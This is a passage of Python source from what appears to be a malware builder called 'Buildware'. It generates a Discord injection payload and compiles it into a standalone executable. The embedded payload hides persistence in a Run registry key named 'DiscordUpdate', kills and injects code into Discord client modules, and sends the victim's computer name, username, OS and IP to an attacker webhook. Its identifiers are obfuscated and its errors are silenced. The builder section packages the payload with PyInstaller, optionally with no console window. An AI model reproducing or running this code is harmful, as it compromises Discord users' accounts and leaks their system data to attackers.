        _0xKey = _0xWR.OpenKey(_0xWR.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, _0xWR.KEY_SET_VALUE)
        if _0xDst.endswith('.exe'):
            _0xWR.SetValueEx(_0xKey, 'DiscordUpdate', 0, _0xWR.REG_SZ, '"' + _0xDst + '"')
        else:
            _0xWR.SetValueEx(_0xKey, 'DiscordUpdate', 0, _0xWR.REG_SZ, 'pythonw "' + _0xDst + '"')
        _0xWR.CloseKey(_0xKey)
    except Exception:
        pass

def _0xMain():
    import time as _0xt1m3
    _0xPersist()
    _0xKilled = _0xKill_Discord()
    if _0xKilled:
        _0xt1m3.sleep(2)
    _0xResults = []
    for _0xName, _0xPath in _PATHS.items():
        if not _0x1a2b3c.path.exists(_0xPath):
            continue
        try:
            _0xModules = _0xFind_Discord_Modules(_0xPath)
            if not _0xModules:
                continue
            for _0xModule in _0xModules:
                _0xStatus = _0xInject_Code(_0xModule)
                if _0xStatus == 'success':
                    _0xResults.append((_0xName, _0xModule))
        except Exception:
            pass
    if _0xKilled:
        _0xRestart_Discord()
    if _0xResults:
        try:
            if not _0xVerifyWebhook():
                return
            _0xInfo = _0xGet_System_Info()
            _0xSysStr = 'Computer : ' + _0xInfo.get('computer', 'N/A') + '\nUsername : ' + _0xInfo.get('username', 'N/A') + '\nOS       : ' + _0xInfo.get('os', 'N/A') + '\nIP       : ' + _0xInfo.get('ip', 'N/A')
            _0xPayload = {
                "username": "Buildware 1nj3ct10n",
                "avatar_url": "https://cdn.discordapp.com/avatars/1402299544712253541/64b913d3d165e3c465343c4e296227ba.png",
                "embeds": [{
                    "title": "💉 Injection Successful! (" + str(len(_0xResults)) + ")",
                    "color": 3066993,
                    "thumbnail": {"url": "https://cdn.discordapp.com/avatars/1402299544712253541/64b913d3d165e3c465343c4e296227ba.png"},
                    "fields": [
                        {
                            "name": "📂 Injected Clients",
                            "value": "\n".join(["**" + r[0] + ":**\n```" + r[1] + "```" for r in _0xResults]),
                            "inline": False
                        },
                        {
                            "name": "👤 System Information",
                            "value": "```" + _0xSysStr + "```",
                            "inline": False
                        }
                    ],
                    "footer": {
                        "text": "Buildware 1nj3ct10n",
                        "icon_url": "https://cdn.discordapp.com/avatars/1402299544712253541/64b913d3d165e3c465343c4e296227ba.png"
                    },
                    "timestamp": _0x6v7w8x.now().astimezone().isoformat()
                }]
            }
            _0x3s4t5u.post(_0xURL, json=_0xPayload, timeout=10)
        except Exception:
            pass

if __name__ == "__main__":
    try:
        _0xMain()
    except KeyboardInterrupt:
        pass
    except Exception:
        pass
'''

    Code = (Code_template
        .replace("{part1}", part1)
        .replace("{part2}", part2)
        .replace("{part3}", part3)
    )

    import shutil
    import time

    output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Output/DiscordInjection")
    os.makedirs(output_dir, exist_ok=True)

    def cleanup_build(temp_py, icon_path, temp_icon, output_dir, filename):
        for f in [temp_py, os.path.join(output_dir, f"{filename}.spec")]:
            if f and os.path.exists(f):
                os.remove(f)
        if temp_icon and icon_path and os.path.exists(icon_path):
            os.remove(icon_path)
        build_dir = os.path.join(output_dir, "build")
        if os.path.exists(build_dir):
            for _ in range(3):
                try:
                    time.sleep(0.5)
                    shutil.rmtree(build_dir, ignore_errors=True)
                    break
                except Exception:
                    continue

    def save_as_python(code, output_dir, filename):
        output_path = os.path.join(output_dir, f"{filename}.py")
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(code)
        print(f"{SUCCESS} Python file created:{red} {output_path}", reset)

    if extension == ".exe":
        temp_py = os.path.join(output_dir, f"{filename}.py")
        with open(temp_py, "w", encoding="utf-8") as f:
            f.write(Code)

        try:
            import pefile
        except ImportError:
            print(f"{LOADING} Installing pefile dependency..", reset)
            result = subprocess.run([sys.executable, "-m", "pip", "install", "pefile", "--force-reinstall"], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{SUCCESS} pefile installed successfully!", reset)
            else:
                print(f"{ERROR} Failed to install pefile!", reset)
                if result.stderr:
                    print(f"{red}{result.stderr}{reset}")

        try:
            import PyInstaller
        except ImportError:
            print(f"{LOADING} Installation PyInstaller..", reset)
            result = subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller", "pefile"], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{SUCCESS} PyInstaller installed successfully!", reset)
            else:
                print(f"{ERROR} Failed to install PyInstaller!", reset)
                if result.stderr:
                    print(f"{red}{result.stderr}{reset}")

        print(f"{LOADING} Building .exe file..", reset)

        try:
            pyinstaller_args = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--clean",
                f"--distpath={output_dir}",
                f"--workpath={os.path.join(output_dir, 'build')}",
                f"--specpath={output_dir}",
                "--hidden-import=requests",
            ]

            if noconsole:
                pyinstaller_args.append("--noconsole")

            if icon_path:
                pyinstaller_args.append(f"--icon={icon_path}")

            pyinstaller_args.append(temp_py)

            result = subprocess.run(pyinstaller_args, capture_output=True, text=True)

            if result.returncode != 0:
                cleanup_build(temp_py, icon_path, temp_icon, output_dir, filename)
                print(f"{ERROR} PyInstaller build failed!", reset)
                if result.stderr:
                    print(f"{ERROR} Error output:", reset)
                    for line in result.stderr.split('\n')[-10:]:
                        if line.strip():
                            print(f"  {red}{line}{reset}")
                print(f"{INFO} Saving as Python file instead.", reset)
                save_as_python(Code, output_dir, filename)
            else:
                cleanup_build(temp_py, icon_path, temp_icon, output_dir, filename)
                output_path = os.path.join(output_dir, f"{filename}.exe")
                print(f"{SUCCESS} Executable file created:{red} {output_path}", reset)
        except Exception as e:
            cleanup_build(temp_py, icon_path, temp_icon, output_dir, filename)
            print(f"{ERROR} Unexpected error:{red} {e}", reset)
            print(f"{INFO} Saving as Python file instead.", reset)
            save_as_python(Code, output_dir, filename)
    else:
        save_as_python(Code, output_dir, filename)

    os.startfile(output_dir)
    Continue()
    Reset()

except Exception as e:
    Error(e)
